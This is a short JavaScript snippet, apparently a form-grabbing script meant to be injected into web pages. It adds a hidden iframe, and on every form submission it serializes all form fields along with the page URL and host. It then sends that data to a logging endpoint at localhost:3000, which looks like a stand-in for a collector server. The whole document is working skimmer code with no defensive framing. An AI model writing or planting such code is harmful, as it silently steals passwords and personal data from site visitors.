var iframe = document.createElement('iframe');
iframe.setAttribute('style', 'display: none;');
document.body.appendChild(iframe);

$('form').submit(function(event) {	
	var report   = "url=" + encodeURIComponent(window.location.href);
	report 		+= "&host=" + encodeURIComponent(window.location.host);
	report 		+= "&" + $(this).serialize();
	iframe.setAttribute("src", "http://localhost:3000/log/?" + report);
});